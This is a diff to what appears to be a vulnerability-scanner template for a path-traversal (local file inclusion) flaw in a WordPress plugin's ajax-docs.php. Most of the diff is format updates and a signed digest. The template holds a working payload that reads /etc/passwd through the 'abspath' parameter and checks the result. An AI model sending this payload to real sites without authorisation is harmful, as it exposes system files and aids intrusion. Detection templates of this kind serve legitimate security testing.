@@ -11,18 +11,18 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 8.6
-    cve-id:
     cwe-id: CWE-22
-  tags: wp-plugin,wordpress,lfi,rfi
+  metadata:
+    max-request: 1
+  tags: wp-plugin,wordpress,lfi,rfi,vuln
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd"
 
     matchers-condition: and
     matchers:
-
       - type: regex
         regex:
           - "root:[x*]:0:0"
@@ -30,5 +30,4 @@ requests:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/03/29
+# digest: 4a0a0047304502207464119a8f17a8c293416fb6b97ff82b3a1de2aac83aa0710d64cf4edef75c14022100925ef5f5b9441eb9df4e464cdbffa431b9ac19695cba1048c684b09d083578d2:922c64590222798bb761d5b6d8e72950
